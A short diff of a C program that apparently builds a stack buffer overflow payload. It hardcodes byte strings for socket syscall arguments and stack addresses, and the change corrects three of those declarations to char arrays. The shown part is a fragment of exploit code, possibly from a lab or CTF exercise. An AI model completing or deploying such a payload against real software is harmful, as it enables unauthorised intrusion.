@@ -27,9 +27,9 @@ int main(void)
   char socket_arg1[] = "\x8a\x01\x01\x01";
   char socket_arg2[] = "\x01\x01\x01\x01";
 
-  char socket_stack_arg1_address = "\x00\x68\xbf\xbf"; // -> 2
-  char socket_stack_arg2_address = "\x04\x68\xbf\xbf"; // -> 1
-  char socket_stack_arg3_address = "\x08\x68\xbf\xbf"; // -> 0
+  char socket_stack_arg1_address[] = "\x00\x68\xbf\xbf"; // -> 2
+  char socket_stack_arg2_address[] = "\x04\x68\xbf\xbf"; // -> 1
+  char socket_stack_arg3_address[] = "\x08\x68\xbf\xbf"; // -> 0
 
   int i;
   // Fill up buffer
